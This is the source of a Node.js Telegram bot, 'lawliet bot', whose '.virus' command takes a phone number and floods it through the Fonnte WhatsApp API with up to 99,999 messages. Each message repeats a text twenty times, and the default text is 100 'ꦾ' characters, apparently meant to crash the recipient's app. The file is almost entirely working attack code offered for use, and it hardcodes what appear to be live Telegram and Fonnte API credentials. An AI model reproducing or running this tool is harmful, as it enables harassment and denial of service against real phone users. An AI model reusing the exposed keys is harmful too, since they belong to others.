// bot_kirim2_mod.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'ctKBo8JdYJ3XqxPBD6Fg';
if(!TELEGRAM_TOKEN || !FONNTE_KEY){ console.error('Set TELEGRAM_TOKEN & FONNTE_KEY'); process.exit(1); }

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const make20 = txt => Array.from({length:20}).map(()=>txt).join('\n');
const sleep = ms => new Promise(r=>setTimeout(r,ms));

// ===== EVENT MESSAGE =====
bot.on('message', async msg=>{
  try{
    const chatId = msg.chat.id;
    const t = (msg.text||'').trim();

    // ===== PERINTAH .menu =====
    if(t === '.menu') {
      if(!fs.existsSync('./nina.jpg'))
        return bot.sendMessage(chatId, 'Foto nina.jpg tidak ditemukan!');

      const caption = `こんにちは、私はrifatによって作られたボット *lawliet bot* です
*Dev:* @rifat M rifat
*Name bot:* lawliet bot
*Version:* v2
いらっしゃいませ`;

      const opts = {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: '📜 MENU BUG', callback_data: 'menu_bot' }]
          ]
        }
      };

      await bot.sendChatAction(chatId, 'upload_photo');
      await bot.sendPhoto(chatId, fs.readFileSync('./nina.jpg'), { caption, ...opts });
      return;
    }

    // ===== PERINTAH .virus =====
    if(!t.startsWith('.virus')) return;
    const parts = t.split(/\s+/);
    const target = parts[1];
    const text = parts.slice(2).join(' ') || 'ꦾ'.repeat(100);

    if(!target) return bot.sendMessage(chatId,'Format: .virus 62812xxxx [isi]');

    const payloadText = make20(text);
    const startMsg = await bot.sendMessage(chatId, `🚀 Mengirim pesan ke *${target}*...`, { parse_mode: 'Markdown' });

    // kirim banyak pesan, tapi update 1 pesan status saja
    let successCount = 0;
    let failCount = 0;
    for (let i = 1; i <= 99999; i++) {
      try {
        await axios.post('https://api.fonnte.com/send',
          { target: target.trim(), message: payloadText },
          { headers: { Authorization: FONNTE_KEY }, timeout: 20000 }
        );
        successCount++;
      } catch (e) {
        failCount++;
      }

      // Update status tiap beberapa detik
      if (i % 5 === 0) {
        await bot.editMessageText(
          `📤 Progress: *${i} pesan dikirim...*\n✅ Berhasil: ${successCount}\n❌ Gagal: ${failCount}`,
          { chat_id: chatId, message_id: startMsg.message_id, parse_mode: 'Markdown' }
        );
      }

      await sleep(5);
    }

    // Setelah selesai kirim
    if(!fs.existsSync('./mani.jpg'))
      return bot.sendMessage(chatId, `✅ SUCCESS send ${target}\nMereka hanyalah rakyat biasa`);

    const captionDone = `✅ *SUCCESS* send *${target}*\nMereka hanyalah rakyat biasa`;

    await bot.sendChatAction(chatId, 'upload_photo');
    await bot.sendPhoto(chatId, fs.readFileSync('./mani.jpg'), {
      caption: captionDone,
      parse_mode: 'Markdown'
    });

  } catch(e){
    console.error(e?.response?.data || e.message);
    bot.sendMessage(msg.chat.id, '❌ Gagal. Cek API key / koneksi.');
  }
});

// ===== CALLBACK UNTUK TOMBOL "MENU BOT" =====
bot.on('callback_query', async query => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'menu_bot') {
    if(!fs.existsSync('./mama.jpg'))
      return bot.sendMessage(chatId, 'Foto mama.jpg tidak ditemukan!');

    const caption = `番号を入力して直接送信\n\n*DEV:* RIFAT\n*V:* v1\n\n送信 .virus 62××××××\nまだ受け入れる`;

    await bot.sendChatAction(chatId, 'upload_photo');
    await bot.sendPhoto(chatId, fs.readFileSync('./mama.jpg'), {
      caption,
      parse_mode: "Markdown"
    });
    await bot.answerCallbackQuery(query.id, { text: '📋 Menampilkan menu bot...' });
  }
});
